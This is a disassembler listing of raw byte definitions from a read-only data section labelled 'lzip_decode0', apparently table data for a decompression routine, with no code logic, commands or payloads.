.rodata.lzip_decode0:000000000000B5EE                 db    0
.rodata.lzip_decode0:000000000000B5EF                 db    0
.rodata.lzip_decode0:000000000000B5F0                 db    4
.rodata.lzip_decode0:000000000000B5F1                 db    0
.rodata.lzip_decode0:000000000000B5F2                 db 0F0h
.rodata.lzip_decode0:000000000000B5F3                 db  0Ch
.rodata.lzip_decode0:000000000000B5F4                 db  72h ; r
.rodata.lzip_decode0:000000000000B5F5                 db    2
.rodata.lzip_decode0:000000000000B5F6                 db    0
.rodata.lzip_decode0:000000000000B5F7                 db    0
.rodata.lzip_decode0:000000000000B5F8                 db    3
.rodata.lzip_decode0:000000000000B5F9                 db    0
.rodata.lzip_decode0:000000000000B5FA                 db    0
.rodata.lzip_decode0:000000000000B5FB                 db    0
.rodata.lzip_decode0:000000000000B5FC                 db 0C2h
.rodata.lzip_decode0:000000000000B5FD                 db    0
.rodata.lzip_decode0:000000000000B5FE                 db    0
.rodata.lzip_decode0:000000000000B5FF                 db    0
.rodata.lzip_decode0:000000000000B600                 db 0C2h
.rodata.lzip_decode0:000000000000B601                 db    0
.rodata.lzip_decode0:000000000000B602                 db    0
.rodata.lzip_decode0:000000000000B603                 db    0
.rodata.lzip_decode0:000000000000B604                 db    4
.rodata.lzip_decode0:000000000000B605                 db    0
.rodata.lzip_decode0:000000000000B606                 db 0C0h
.rodata.lzip_decode0:000000000000B607                 db  0Bh
.rodata.lzip_decode0:000000000000B608                 db  72h ; r
.rodata.lzip_decode0:000000000000B609                 db    2
.rodata.lzip_decode0:000000000000B60A                 db    0
.rodata.lzip_decode0:000000000000B60B                 db    0
.rodata.lzip_decode0:000000000000B60C                 db  12h
.rodata.lzip_decode0:000000000000B60D                 db    0
.rodata.lzip_decode0:000000000000B60E                 db    0
.rodata.lzip_decode0:000000000000B60F                 db    0
.rodata.lzip_decode0:000000000000B610                 db  33h ; 3
.rodata.lzip_decode0:000000000000B611                 db    1
.rodata.lzip_decode0:000000000000B612                 db    0
.rodata.lzip_decode0:000000000000B613                 db    0
.rodata.lzip_decode0:000000000000B614                 db  33h ; 3
.rodata.lzip_decode0:000000000000B615                 db    0
.rodata.lzip_decode0:000000000000B616                 db    0
.rodata.lzip_decode0:000000000000B617                 db    0
.rodata.lzip_decode0:000000000000B618                 db 0F2h
.rodata.lzip_decode0:000000000000B619                 db    1
.rodata.lzip_decode0:000000000000B61A                 db    0
.rodata.lzip_decode0:000000000000B61B                 db    0
.rodata.lzip_decode0:000000000000B61C                 db 0F3h
.rodata.lzip_decode0:000000000000B61D                 db    1
.rodata.lzip_decode0:000000000000B61E                 db    0
.rodata.lzip_decode0:000000000000B61F                 db    0
.rodata.lzip_decode0:000000000000B620                 db    2
.rodata.lzip_decode0:000000000000B621                 db    1
.rodata.lzip_decode0:000000000000B622                 db    0
.rodata.lzip_decode0:000000000000B623                 db    0
.rodata.lzip_decode0:000000000000B624                 db    4
.rodata.lzip_decode0:000000000000B625                 db    0
.rodata.lzip_decode0:000000000000B626                 db  90h
.rodata.lzip_decode0:000000000000B627                 db  0Ah
.rodata.lzip_decode0:000000000000B628                 db  32h ; 2
.rodata.lzip_decode0:000000000000B629                 db    4
.rodata.lzip_decode0:000000000000B62A                 db    0
.rodata.lzip_decode0:000000000000B62B                 db    0
.rodata.lzip_decode0:000000000000B62C                 db  23h ; #
.rodata.lzip_decode0:000000000000B62D                 db    0
.rodata.lzip_decode0:000000000000B62E                 db    0
.rodata.lzip_decode0:000000000000B62F                 db    0
.rodata.lzip_decode0:000000000000B630                 db  53h ; S
.rodata.lzip_decode0:000000000000B631                 db    0
.rodata.lzip_decode0:000000000000B632                 db    0
.rodata.lzip_decode0:000000000000B633                 db    0
.rodata.lzip_decode0:000000000000B634                 db  93h
.rodata.lzip_decode0:000000000000B635                 db    1
.rodata.lzip_decode0:000000000000B636                 db    0
.rodata.lzip_decode0:000000000000B637                 db    0
.rodata.lzip_decode0:000000000000B638                 db    4
.rodata.lzip_decode0:000000000000B639                 db    0
.rodata.lzip_decode0:000000000000B63A                 db  98h
.rodata.lzip_decode0:000000000000B63B                 db  0Bh
.rodata.lzip_decode0:000000000000B63C                 db  62h ; b
.rodata.lzip_decode0:000000000000B63D                 db    2
.rodata.lzip_decode0:000000000000B63E                 db    0
.rodata.lzip_decode0:000000000000B63F                 db    0
.rodata.lzip_decode0:000000000000B640                 db  83h
.rodata.lzip_decode0:000000000000B641                 db    0
.rodata.lzip_decode0:000000000000B642                 db    0
.rodata.lzip_decode0:000000000000B643                 db    0
.rodata.lzip_decode0:000000000000B644                 db  82h
.rodata.lzip_decode0:000000000000B645                 db    0
.rodata.lzip_decode0:000000000000B646                 db    0
.rodata.lzip_decode0:000000000000B647                 db    0
.rodata.lzip_decode0:000000000000B648                 db 0B2h
.rodata.lzip_decode0:000000000000B649                 db    1
.rodata.lzip_decode0:000000000000B64A                 db    0
.rodata.lzip_decode0:000000000000B64B                 db    0
.rodata.lzip_decode0:000000000000B64C                 db 0C3h
.rodata.lzip_decode0:000000000000B64D                 db    1
.rodata.lzip_decode0:000000000000B64E                 db    0
.rodata.lzip_decode0:000000000000B64F                 db    0
.rodata.lzip_decode0:000000000000B650                 db  42h ; B
.rodata.lzip_decode0:000000000000B651                 db    0
.rodata.lzip_decode0:000000000000B652                 db    0
.rodata.lzip_decode0:000000000000B653                 db    0
.rodata.lzip_decode0:000000000000B654                 db    4
.rodata.lzip_decode0:000000000000B655                 db    0
.rodata.lzip_decode0:000000000000B656                 db 0E0h
.rodata.lzip_decode0:000000000000B657                 db    3
.rodata.lzip_decode0:000000000000B658                 db  12h
.rodata.lzip_decode0:000000000000B659                 db    2
.rodata.lzip_decode0:000000000000B65A                 db    0
.rodata.lzip_decode0:000000000000B65B                 db    0
.rodata.lzip_decode0:000000000000B65C                 db  43h ; C
.rodata.lzip_decode0:000000000000B65D                 db    0
.rodata.lzip_decode0:000000000000B65E                 db    0
.rodata.lzip_decode0:000000000000B65F                 db    0
.rodata.lzip_decode0:000000000000B660                 db  92h
.rodata.lzip_decode0:000000000000B661                 db    0
.rodata.lzip_decode0:000000000000B662                 db    0
.rodata.lzip_decode0:000000000000B663                 db    0
.rodata.lzip_decode0:000000000000B664                 db  52h ; R
.rodata.lzip_decode0:000000000000B665                 db    1
.rodata.lzip_decode0:000000000000B666                 db    0
.rodata.lzip_decode0:000000000000B667                 db    0
.rodata.lzip_decode0:000000000000B668                 db 0A3h
.rodata.lzip_decode0:000000000000B669                 db    2
.rodata.lzip_decode0:000000000000B66A                 db    0
.rodata.lzip_decode0:000000000000B66B                 db    0
.rodata.lzip_decode0:000000000000B66C                 db 0F2h
.rodata.lzip_decode0:000000000000B66D                 db    1
.rodata.lzip_decode0:000000000000B66E                 db    0
.rodata.lzip_decode0:000000000000B66F                 db    0
.rodata.lzip_decode0:000000000000B670                 db  83h
.rodata.lzip_decode0:000000000000B671                 db    1
.rodata.lzip_decode0:000000000000B672                 db    0
.rodata.lzip_decode0:000000000000B673                 db    0
.rodata.lzip_decode0:000000000000B674                 db 0A2h
.rodata.lzip_decode0:000000000000B675                 db    0
.rodata.lzip_decode0:000000000000B676                 db    0
.rodata.lzip_decode0:000000000000B677                 db    0
.rodata.lzip_decode0:000000000000B678                 db 0B3h
.rodata.lzip_decode0:000000000000B679                 db    0
.rodata.lzip_decode0:000000000000B67A                 db    0
.rodata.lzip_decode0:000000000000B67B                 db    0
.rodata.lzip_decode0:000000000000B67C                 db 0B3h
.rodata.lzip_decode0:000000000000B67D                 db    0
.rodata.lzip_decode0:000000000000B67E                 db    0
.rodata.lzip_decode0:000000000000B67F                 db    0
.rodata.lzip_decode0:000000000000B680                 db    2
.rodata.lzip_decode0:000000000000B681                 db    1
.rodata.lzip_decode0:000000000000B682                 db    0
.rodata.lzip_decode0:000000000000B683                 db    0
.rodata.lzip_decode0:000000000000B684                 db  63h ; c
.rodata.lzip_decode0:000000000000B685                 db    0
.rodata.lzip_decode0:000000000000B686                 db    0
.rodata.lzip_decode0:000000000000B687                 db    0
.rodata.lzip_decode0:000000000000B688                 db  20h
.rodata.lzip_decode0:000000000000B689                 db    0
.rodata.lzip_decode0:000000000000B68A                 db  84h
.rodata.lzip_decode0:000000000000B68B                 db    0
.rodata.lzip_decode0:000000000000B68C                 db 0C0h
.rodata.lzip_decode0:000000000000B68D                 db    1
.rodata.lzip_decode0:000000000000B68E                 db  64h ; d
.rodata.lzip_decode0:000000000000B68F                 db    0
.rodata.lzip_decode0:000000000000B690                 db 0E0h
.rodata.lzip_decode0:000000000000B691                 db    1
.rodata.lzip_decode0:000000000000B692                 db  50h ; P
.rodata.lzip_decode0:000000000000B693                 db    0
.rodata.lzip_decode0:000000000000B694                 db  60h ; `
.rodata.lzip_decode0:000000000000B695                 db    1
.rodata.lzip_decode0:000000000000B696                 db  34h ; 4
.rodata.lzip_decode0:000000000000B697                 db    0
.rodata.lzip_decode0:000000000000B698                 db  32h ; 2
.rodata.lzip_decode0:000000000000B699                 db    2
.rodata.lzip_decode0:000000000000B69A                 db    0
.rodata.lzip_decode0:000000000000B69B                 db    0
.rodata.lzip_decode0:000000000000B69C                 db  11h
.rodata.lzip_decode0:000000000000B69D                 db    3
.rodata.lzip_decode0:000000000000B69E                 db  10h
.rodata.lzip_decode0:000000000000B69F                 db    0
.rodata.lzip_decode0:000000000000B6A0                 db    4
.rodata.lzip_decode0:000000000000B6A1                 db    0
.rodata.lzip_decode0:000000000000B6A2                 db  88h
.rodata.lzip_decode0:000000000000B6A3                 db  0Ah
.rodata.lzip_decode0:000000000000B6A4                 db  12h
.rodata.lzip_decode0:000000000000B6A5                 db    2
.rodata.lzip_decode0:000000000000B6A6                 db    0
.rodata.lzip_decode0:000000000000B6A7                 db    0
.rodata.lzip_decode0:000000000000B6A8                 db  42h ; B
.rodata.lzip_decode0:000000000000B6A9                 db    0
.rodata.lzip_decode0:000000000000B6AA                 db    0
.rodata.lzip_decode0:000000000000B6AB                 db    0
.rodata.lzip_decode0:000000000000B6AC                 db    3
.rodata.lzip_decode0:000000000000B6AD                 db    1
.rodata.lzip_decode0:000000000000B6AE                 db    0
.rodata.lzip_decode0:000000000000B6AF                 db    0
.rodata.lzip_decode0:000000000000B6B0                 db    0
.rodata.lzip_decode0:000000000000B6B1                 db    3
.rodata.lzip_decode0:000000000000B6B2                 db  10h
.rodata.lzip_decode0:000000000000B6B3                 db    0
.rodata.lzip_decode0:000000000000B6B4                 db 0E2h
.rodata.lzip_decode0:000000000000B6B5                 db    2
.rodata.lzip_decode0:000000000000B6B6                 db    0
.rodata.lzip_decode0:000000000000B6B7                 db    0
.rodata.lzip_decode0:000000000000B6B8                 db    4
.rodata.lzip_decode0:000000000000B6B9                 db    0
.rodata.lzip_decode0:000000000000B6BA                 db 0C0h
.rodata.lzip_decode0:000000000000B6BB                 db  0Ah
.rodata.lzip_decode0:000000000000B6BC                 db  42h ; B
.rodata.lzip_decode0:000000000000B6BD                 db    1
.rodata.lzip_decode0:000000000000B6BE                 db    0
.rodata.lzip_decode0:000000000000B6BF                 db    0
.rodata.lzip_decode0:000000000000B6C0                 db  13h
.rodata.lzip_decode0:000000000000B6C1                 db    0
.rodata.lzip_decode0:000000000000B6C2                 db    0
.rodata.lzip_decode0:000000000000B6C3                 db    0
.rodata.lzip_decode0:000000000000B6C4                 db 0B3h
.rodata.lzip_decode0:000000000000B6C5                 db    1
.rodata.lzip_decode0:000000000000B6C6                 db    0
.rodata.lzip_decode0:000000000000B6C7                 db    0
.rodata.lzip_decode0:000000000000B6C8                 db    4
.rodata.lzip_decode0:000000000000B6C9                 db    0
.rodata.lzip_decode0:000000000000B6CA                 db  98h
.rodata.lzip_decode0:000000000000B6CB                 db    7
.rodata.lzip_decode0:000000000000B6CC                 db  32h ; 2
.rodata.lzip_decode0:000000000000B6CD                 db    1
.rodata.lzip_decode0:000000000000B6CE                 db    0
.rodata.lzip_decode0:000000000000B6CF                 db    0
.rodata.lzip_decode0:000000000000B6D0                 db    3
.rodata.lzip_decode0:000000000000B6D1                 db    0
.rodata.lzip_decode0:000000000000B6D2                 db    0
.rodata.lzip_decode0:000000000000B6D3                 db    0
.rodata.lzip_decode0:000000000000B6D4                 db    3
.rodata.lzip_decode0:000000000000B6D5                 db    0
.rodata.lzip_decode0:000000000000B6D6                 db    0
.rodata.lzip_decode0:000000000000B6D7                 db    0
.rodata.lzip_decode0:000000000000B6D8                 db  42h ; B
.rodata.lzip_decode0:000000000000B6D9                 db    0
.rodata.lzip_decode0:000000000000B6DA                 db    0
.rodata.lzip_decode0:000000000000B6DB                 db    0
.rodata.lzip_decode0:000000000000B6DC                 db 0D2h
.rodata.lzip_decode0:000000000000B6DD                 db    0
.rodata.lzip_decode0:000000000000B6DE                 db    0
.rodata.lzip_decode0:000000000000B6DF                 db    0
.rodata.lzip_decode0:000000000000B6E0                 db  13h
.rodata.lzip_decode0:000000000000B6E1                 db    1
.rodata.lzip_decode0:000000000000B6E2                 db    0
.rodata.lzip_decode0:000000000000B6E3                 db    0
.rodata.lzip_decode0:000000000000B6E4                 db  53h ; S
.rodata.lzip_decode0:000000000000B6E5                 db    0
.rodata.lzip_decode0:000000000000B6E6                 db    0
.rodata.lzip_decode0:000000000000B6E7                 db    0
.rodata.lzip_decode0:000000000000B6E8                 db    4
.rodata.lzip_decode0:000000000000B6E9                 db    0
.rodata.lzip_decode0:000000000000B6EA                 db  18h
.rodata.lzip_decode0:000000000000B6EB                 db    9
.rodata.lzip_decode0:000000000000B6EC                 db  22h ; "
.rodata.lzip_decode0:000000000000B6ED                 db    1
.rodata.lzip_decode0:000000000000B6EE                 db    0
.rodata.lzip_decode0:000000000000B6EF                 db    0
.rodata.lzip_decode0:000000000000B6F0                 db  12h
.rodata.lzip_decode0:000000000000B6F1                 db    0
.rodata.lzip_decode0:000000000000B6F2                 db    0
.rodata.lzip_decode0:000000000000B6F3                 db    0
.rodata.lzip_decode0:000000000000B6F4                 db    4
.rodata.lzip_decode0:000000000000B6F5                 db    0
.rodata.lzip_decode0:000000000000B6F6                 db 0D0h
.rodata.lzip_decode0:000000000000B6F7                 db    1
.rodata.lzip_decode0:000000000000B6F8                 db  82h
.rodata.lzip_decode0:000000000000B6F9                 db    1
.rodata.lzip_decode0:000000000000B6FA                 db    0
.rodata.lzip_decode0:000000000000B6FB                 db    0
.rodata.lzip_decode0:000000000000B6FC                 db  33h ; 3
.rodata.lzip_decode0:000000000000B6FD                 db    1
.rodata.lzip_decode0:000000000000B6FE                 db    0
.rodata.lzip_decode0:000000000000B6FF                 db    0
.rodata.lzip_decode0:000000000000B700                 db 0C2h
.rodata.lzip_decode0:000000000000B701                 db    0
.rodata.lzip_decode0:000000000000B702                 db    0
.rodata.lzip_decode0:000000000000B703                 db    0
.rodata.lzip_decode0:000000000000B704                 db 0A3h
.rodata.lzip_decode0:000000000000B705                 db    1
.rodata.lzip_decode0:000000000000B706                 db    0
.rodata.lzip_decode0:000000000000B707                 db    0
.rodata.lzip_decode0:000000000000B708                 db 0B2h
.rodata.lzip_decode0:000000000000B709                 db    1
.rodata.lzip_decode0:000000000000B70A                 db    0
.rodata.lzip_decode0:000000000000B70B                 db    0
.rodata.lzip_decode0:000000000000B70C                 db  33h ; 3
.rodata.lzip_decode0:000000000000B70D                 db    0
.rodata.lzip_decode0:000000000000B70E                 db    0
.rodata.lzip_decode0:000000000000B70F                 db    0
.rodata.lzip_decode0:000000000000B710                 db  43h ; C
.rodata.lzip_decode0:000000000000B711                 db    1
.rodata.lzip_decode0:000000000000B712                 db    0
.rodata.lzip_decode0:000000000000B713                 db    0
.rodata.lzip_decode0:000000000000B714                 db  82h
.rodata.lzip_decode0:000000000000B715                 db    1
.rodata.lzip_decode0:000000000000B716                 db    0
.rodata.lzip_decode0:000000000000B717                 db    0
.rodata.lzip_decode0:000000000000B718                 db  53h ; S
.rodata.lzip_decode0:000000000000B719                 db    0
.rodata.lzip_decode0:000000000000B71A                 db    0
.rodata.lzip_decode0:000000000000B71B                 db    0
.rodata.lzip_decode0:000000000000B71C                 db  23h ; #
.rodata.lzip_decode0:000000000000B71D                 db    1
.rodata.lzip_decode0:000000000000B71E                 db    0
.rodata.lzip_decode0:000000000000B71F                 db    0
.rodata.lzip_decode0:000000000000B720                 db  43h ; C
.rodata.lzip_decode0:000000000000B721                 db    0
.rodata.lzip_decode0:000000000000B722                 db    0
.rodata.lzip_decode0:000000000000B723                 db    0
.rodata.lzip_decode0:000000000000B724                 db 0C2h
.rodata.lzip_decode0:000000000000B725                 db    0
.rodata.lzip_decode0:000000000000B726                 db    0
.rodata.lzip_decode0:000000000000B727                 db    0
.rodata.lzip_decode0:000000000000B728                 db    3
.rodata.lzip_decode0:000000000000B729                 db    0
.rodata.lzip_decode0:000000000000B72A                 db    0
.rodata.lzip_decode0:000000000000B72B                 db    0
.rodata.lzip_decode0:000000000000B72C                 db    4
.rodata.lzip_decode0:000000000000B72D                 db    0
.rodata.lzip_decode0:000000000000B72E                 db  40h ; @
.rodata.lzip_decode0:000000000000B72F                 db    5
.rodata.lzip_decode0:000000000000B730                 db  32h ; 2
.rodata.lzip_decode0:000000000000B731                 db    1
.rodata.lzip_decode0:000000000000B732                 db    0
.rodata.lzip_decode0:000000000000B733                 db    0
.rodata.lzip_decode0:000000000000B734                 db    3
.rodata.lzip_decode0:000000000000B735                 db    0
.rodata.lzip_decode0:000000000000B736                 db    0
.rodata.lzip_decode0:000000000000B737                 db    0
.rodata.lzip_decode0:000000000000B738                 db    3
.rodata.lzip_decode0:000000000000B739                 db    0
.rodata.lzip_decode0:000000000000B73A                 db    0
.rodata.lzip_decode0:000000000000B73B                 db    0
.rodata.lzip_decode0:000000000000B73C                 db  42h ; B
.rodata.lzip_decode0:000000000000B73D                 db    0
.rodata.lzip_decode0:000000000000B73E                 db    0
.rodata.lzip_decode0:000000000000B73F                 db    0
.rodata.lzip_decode0:000000000000B740                 db 0D2h
.rodata.lzip_decode0:000000000000B741                 db    0
.rodata.lzip_decode0:000000000000B742                 db    0
.rodata.lzip_decode0:000000000000B743                 db    0
.rodata.lzip_decode0:000000000000B744                 db  13h
.rodata.lzip_decode0:000000000000B745                 db    1
.rodata.lzip_decode0:000000000000B746                 db    0
.rodata.lzip_decode0:000000000000B747                 db    0
.rodata.lzip_decode0:000000000000B748                 db    4
.rodata.lzip_decode0:000000000000B749                 db    0
.rodata.lzip_decode0:000000000000B74A                 db 0F8h
.rodata.lzip_decode0:000000000000B74B                 db    8
.rodata.lzip_decode0:000000000000B74C                 db 0E2h
.rodata.lzip_decode0:000000000000B74D                 db    0
.rodata.lzip_decode0:000000000000B74E                 db    0
.rodata.lzip_decode0:000000000000B74F                 db    0
.rodata.lzip_decode0:000000000000B750                 db 0F2h
.rodata.lzip_decode0:000000000000B751                 db    0
.rodata.lzip_decode0:000000000000B752                 db    0
.rodata.lzip_decode0:000000000000B753                 db    0
.rodata.lzip_decode0:000000000000B754                 db    0
.rodata.lzip_decode0:000000000000B755                 db    2
.rodata.lzip_decode0:000000000000B756                 db  0Ch
.rodata.lzip_decode0:000000000000B757                 db    0
.rodata.lzip_decode0:000000000000B758                 db 0A2h
.rodata.lzip_decode0:000000000000B759                 db    1
.rodata.lzip_decode0:000000000000B75A                 db    0
.rodata.lzip_decode0:000000000000B75B                 db    0
.rodata.lzip_decode0:000000000000B75C                 db  10h
.rodata.lzip_decode0:000000000000B75D                 db    5
.rodata.lzip_decode0:000000000000B75E                 db  94h
.rodata.lzip_decode0:000000000000B75F                 db    0
.rodata.lzip_decode0:000000000000B760                 db  70h ; p
.rodata.lzip_decode0:000000000000B761                 db    3
.rodata.lzip_decode0:000000000000B762                 db  74h ; t
.rodata.lzip_decode0:000000000000B763                 db    0
.rodata.lzip_decode0:000000000000B764                 db  70h ; p
.rodata.lzip_decode0:000000000000B765                 db    3
.rodata.lzip_decode0:000000000000B766                 db  68h ; h
.rodata.lzip_decode0:000000000000B767                 db    0
.rodata.lzip_decode0:000000000000B768                 db 0B0h
.rodata.lzip_decode0:000000000000B769                 db    3
.rodata.lzip_decode0:000000000000B76A                 db  30h ; 0
.rodata.lzip_decode0:000000000000B76B                 db    0
.rodata.lzip_decode0:000000000000B76C                 db  20h
.rodata.lzip_decode0:000000000000B76D                 db    1
.rodata.lzip_decode0:000000000000B76E                 db    4
.rodata.lzip_decode0:000000000000B76F                 db    0
.rodata.lzip_decode0:000000000000B770                 db  31h ; 1
.rodata.lzip_decode0:000000000000B771                 db    3
.rodata.lzip_decode0:000000000000B772                 db  10h
.rodata.lzip_decode0:000000000000B773                 db    0
.rodata.lzip_decode0:000000000000B774                 db  82h
.rodata.lzip_decode0:000000000000B775                 db    0
.rodata.lzip_decode0:000000000000B776                 db    0
.rodata.lzip_decode0:000000000000B777                 db    0
.rodata.lzip_decode0:000000000000B778                 db  22h ; "
.rodata.lzip_decode0:000000000000B779                 db    0
.rodata.lzip_decode0:000000000000B77A                 db    0
.rodata.lzip_decode0:000000000000B77B                 db    0
.rodata.lzip_decode0:000000000000B77C                 db    4
.rodata.lzip_decode0:000000000000B77D                 db    0
.rodata.lzip_decode0:000000000000B77E                 db  90h
.rodata.lzip_decode0:000000000000B77F                 db    9
.rodata.lzip_decode0:000000000000B780                 db 0E3h
.rodata.lzip_decode0:000000000000B781                 db    1
.rodata.lzip_decode0:000000000000B782                 db    0
.rodata.lzip_decode0:000000000000B783                 db    0
.rodata.lzip_decode0:000000000000B784                 db  13h
.rodata.lzip_decode0:000000000000B785                 db    1
.rodata.lzip_decode0:000000000000B786                 db    0
.rodata.lzip_decode0:000000000000B787                 db    0
.rodata.lzip_decode0:000000000000B788                 db  12h
.rodata.lzip_decode0:000000000000B789                 db    5
.rodata.lzip_decode0:000000000000B78A                 db    0
.rodata.lzip_decode0:000000000000B78B                 db    0
.rodata.lzip_decode0:000000000000B78C                 db 0A3h
.rodata.lzip_decode0:000000000000B78D                 db    1
.rodata.lzip_decode0:000000000000B78E                 db    0
.rodata.lzip_decode0:000000000000B78F                 db    0
.rodata.lzip_decode0:000000000000B790                 db 0F3h
.rodata.lzip_decode0:000000000000B791                 db    0
.rodata.lzip_decode0:000000000000B792                 db    0
.rodata.lzip_decode0:000000000000B793                 db    0
.rodata.lzip_decode0:000000000000B794                 db    4
.rodata.lzip_decode0:000000000000B795                 db    0
.rodata.lzip_decode0:000000000000B796                 db 0A8h
.rodata.lzip_decode0:000000000000B797                 db    4
.rodata.lzip_decode0:000000000000B798                 db  12h
.rodata.lzip_decode0:000000000000B799                 db    4
.rodata.lzip_decode0:000000000000B79A                 db    0
.rodata.lzip_decode0:000000000000B79B                 db    0
.rodata.lzip_decode0:000000000000B79C                 db  43h ; C
.rodata.lzip_decode0:000000000000B79D                 db    1
.rodata.lzip_decode0:000000000000B79E                 db    0
.rodata.lzip_decode0:000000000000B79F                 db    0
.rodata.lzip_decode0:000000000000B7A0                 db  93h
.rodata.lzip_decode0:000000000000B7A1                 db    0
.rodata.lzip_decode0:000000000000B7A2                 db    0
.rodata.lzip_decode0:000000000000B7A3                 db    0
.rodata.lzip_decode0:000000000000B7A4                 db    4
.rodata.lzip_decode0:000000000000B7A5                 db    0
.rodata.lzip_decode0:000000000000B7A6                 db 0E0h
.rodata.lzip_decode0:000000000000B7A7                 db    0
.rodata.lzip_decode0:000000000000B7A8                 db 0D2h
.rodata.lzip_decode0:000000000000B7A9                 db    1
.rodata.lzip_decode0:000000000000B7AA                 db    0
.rodata.lzip_decode0:000000000000B7AB                 db    0
.rodata.lzip_decode0:000000000000B7AC                 db 0D3h
.rodata.lzip_decode0:000000000000B7AD                 db    1
.rodata.lzip_decode0:000000000000B7AE                 db    0
.rodata.lzip_decode0:000000000000B7AF                 db    0
.rodata.lzip_decode0:000000000000B7B0                 db  12h
.rodata.lzip_decode0:000000000000B7B1                 db    0
.rodata.lzip_decode0:000000000000B7B2                 db    0
.rodata.lzip_decode0:000000000000B7B3                 db    0
.rodata.lzip_decode0:000000000000B7B4                 db 0D3h
.rodata.lzip_decode0:000000000000B7B5                 db    0
.rodata.lzip_decode0:000000000000B7B6                 db    0
.rodata.lzip_decode0:000000000000B7B7                 db    0
.rodata.lzip_decode0:000000000000B7B8                 db 0C2h
.rodata.lzip_decode0:000000000000B7B9                 db    1
.rodata.lzip_decode0:000000000000B7BA                 db    0
.rodata.lzip_decode0:000000000000B7BB                 db    0
.rodata.lzip_decode0:000000000000B7BC                 db  43h ; C
.rodata.lzip_decode0:000000000000B7BD                 db    1
.rodata.lzip_decode0:000000000000B7BE                 db    0
.rodata.lzip_decode0:000000000000B7BF                 db    0
.rodata.lzip_decode0:000000000000B7C0                 db  93h
.rodata.lzip_decode0:000000000000B7C1                 db    0
.rodata.lzip_decode0:000000000000B7C2                 db    0
.rodata.lzip_decode0:000000000000B7C3                 db    0
.rodata.lzip_decode0:000000000000B7C4                 db 0C2h
.rodata.lzip_decode0:000000000000B7C5                 db    1
.rodata.lzip_decode0:000000000000B7C6                 db    0
.rodata.lzip_decode0:000000000000B7C7                 db    0
.rodata.lzip_decode0:000000000000B7C8                 db    3
.rodata.lzip_decode0:000000000000B7C9                 db    2
.rodata.lzip_decode0:000000000000B7CA                 db    0
.rodata.lzip_decode0:000000000000B7CB                 db    0
.rodata.lzip_decode0:000000000000B7CC                 db 0A2h
.rodata.lzip_decode0:000000000000B7CD                 db    0
.rodata.lzip_decode0:000000000000B7CE                 db    0
.rodata.lzip_decode0:000000000000B7CF                 db    0
.rodata.lzip_decode0:000000000000B7D0                 db  12h
.rodata.lzip_decode0:000000000000B7D1                 db    1
.rodata.lzip_decode0:000000000000B7D2                 db    0
.rodata.lzip_decode0:000000000000B7D3                 db    0
.rodata.lzip_decode0:000000000000B7D4                 db  92h
.rodata.lzip_decode0:000000000000B7D5                 db    3
.rodata.lzip_decode0:000000000000B7D6                 db    0
.rodata.lzip_decode0:000000000000B7D7                 db    0
.rodata.lzip_decode0:000000000000B7D8                 db 0B3h
.rodata.lzip_decode0:000000000000B7D9                 db    3
.rodata.lzip_decode0:000000000000B7DA                 db    0
.rodata.lzip_decode0:000000000000B7DB                 db    0
.rodata.lzip_decode0:000000000000B7DC                 db  33h ; 3
.rodata.lzip_decode0:000000000000B7DD                 db    1
.rodata.lzip_decode0:000000000000B7DE                 db    0
.rodata.lzip_decode0:000000000000B7DF                 db    0
.rodata.lzip_decode0:000000000000B7E0                 db 0C3h
.rodata.lzip_decode0:000000000000B7E1                 db    0
.rodata.lzip_decode0:000000000000B7E2                 db    0
.rodata.lzip_decode0:000000000000B7E3                 db    0
.rodata.lzip_decode0:000000000000B7E4                 db  62h ; b
.rodata.lzip_decode0:000000000000B7E5                 db    2
.rodata.lzip_decode0:000000000000B7E6                 db    0
.rodata.lzip_decode0:000000000000B7E7                 db    0
.rodata.lzip_decode0:000000000000B7E8                 db  63h ; c
.rodata.lzip_decode0:000000000000B7E9                 db    2
.rodata.lzip_decode0:000000000000B7EA                 db    0
.rodata.lzip_decode0:000000000000B7EB                 db    0
.rodata.lzip_decode0:000000000000B7EC                 db  82h
.rodata.lzip_decode0:000000000000B7ED                 db    0
.rodata.lzip_decode0:000000000000B7EE                 db    0
.rodata.lzip_decode0:000000000000B7EF                 db    0
.rodata.lzip_decode0:000000000000B7F0                 db  63h ; c
.rodata.lzip_decode0:000000000000B7F1                 db    0
.rodata.lzip_decode0:000000000000B7F2                 db    0
.rodata.lzip_decode0:000000000000B7F3                 db    0
.rodata.lzip_decode0:000000000000B7F4                 db  52h ; R
.rodata.lzip_decode0:000000000000B7F5                 db    1
.rodata.lzip_decode0:000000000000B7F6                 db    0
.rodata.lzip_decode0:000000000000B7F7                 db    0
.rodata.lzip_decode0:000000000000B7F8                 db  73h ; s
.rodata.lzip_decode0:000000000000B7F9                 db    1
.rodata.lzip_decode0:000000000000B7FA                 db    0
.rodata.lzip_decode0:000000000000B7FB                 db    0
.rodata.lzip_decode0:000000000000B7FC                 db  73h ; s
.rodata.lzip_decode0:000000000000B7FD                 db    0
.rodata.lzip_decode0:000000000000B7FE                 db    0
.rodata.lzip_decode0:000000000000B7FF                 db    0
.rodata.lzip_decode0:000000000000B800                 db 0A2h
.rodata.lzip_decode0:000000000000B801                 db    0
.rodata.lzip_decode0:000000000000B802                 db    0
.rodata.lzip_decode0:000000000000B803                 db    0
.rodata.lzip_decode0:000000000000B804                 db 0C2h
.rodata.lzip_decode0:000000000000B805                 db    1
.rodata.lzip_decode0:000000000000B806                 db    0
.rodata.lzip_decode0:000000000000B807                 db    0
.rodata.lzip_decode0:000000000000B808                 db  23h ; #
.rodata.lzip_decode0:000000000000B809                 db    1
.rodata.lzip_decode0:000000000000B80A                 db    0
.rodata.lzip_decode0:000000000000B80B                 db    0
.rodata.lzip_decode0:000000000000B80C                 db  53h ; S
.rodata.lzip_decode0:000000000000B80D                 db    1
.rodata.lzip_decode0:000000000000B80E                 db    0
.rodata.lzip_decode0:000000000000B80F                 db    0
.rodata.lzip_decode0:000000000000B810                 db  92h
.rodata.lzip_decode0:000000000000B811                 db    1
.rodata.lzip_decode0:000000000000B812                 db    0
.rodata.lzip_decode0:000000000000B813                 db    0
.rodata.lzip_decode0:000000000000B814                 db  32h ; 2
.rodata.lzip_decode0:000000000000B815                 db    0
.rodata.lzip_decode0:000000000000B816                 db    0
.rodata.lzip_decode0:000000000000B817                 db    0
.rodata.lzip_decode0:000000000000B818                 db 0B3h
.rodata.lzip_decode0:000000000000B819                 db    0
.rodata.lzip_decode0:000000000000B81A                 db    0
.rodata.lzip_decode0:000000000000B81B                 db    0
.rodata.lzip_decode0:000000000000B81C                 db 0A3h
.rodata.lzip_decode0:000000000000B81D                 db    0
.rodata.lzip_decode0:000000000000B81E                 db    0
